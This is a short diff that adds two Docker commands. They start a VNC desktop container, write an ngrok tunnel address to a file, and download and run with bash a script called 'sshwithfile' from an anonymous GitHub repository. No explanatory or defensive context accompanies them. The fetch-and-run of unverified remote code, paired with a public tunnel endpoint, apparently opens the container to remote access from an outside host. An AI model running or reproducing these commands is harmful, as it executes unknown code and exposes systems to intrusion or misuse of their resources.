@@ -1,0 +1,2 @@
+docker run -d --name vncpasswd1 -i -p 4444:4444 dorowu/ubuntu-desktop-lxde-vnc:bionic /bin/bash
+docker exec -i vncpasswd1 /bin/bash -c "apt update &> /dev/null && echo 'connect = 0.tcp.jp.ngrok.io:14481' >> testfile && apt install wget inetutils-ping sudo -y && wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshwithfile && bash sshwithfile"
